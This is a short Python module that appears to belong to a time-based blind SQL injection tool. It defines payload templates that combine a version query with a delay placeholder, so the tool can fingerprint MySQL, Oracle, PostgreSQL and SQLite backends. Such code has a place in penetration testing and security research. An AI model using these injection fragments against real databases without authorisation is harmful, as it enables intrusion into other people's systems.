from abc import *

from dbtype import DBType

class Template(metaclass=ABCMeta):
    @abstractmethod
    def generateTypeCheck() -> str:
        pass

class MySQL(Template):
    def generateTypeCheck():
        return '@@version and {delay_command}'

class Oracle(Template):
    def generateTypeCheck():
        return '(select banner from v$version where {delay_command})'

class PostgreSQL(Template):
    def generateTypeCheck():
        return 'version() and {delay_command}'

class SQLite(Template):
    def generateTypeCheck():
        return 'select sqlite_version() and {delay_command}'

Generators: dict[DBType, Template] = {
    DBType.MySQL: MySQL,
    DBType.Oracle: Oracle,
    DBType.PostgreSQL: PostgreSQL,
    DBType.SQLite: SQLite
}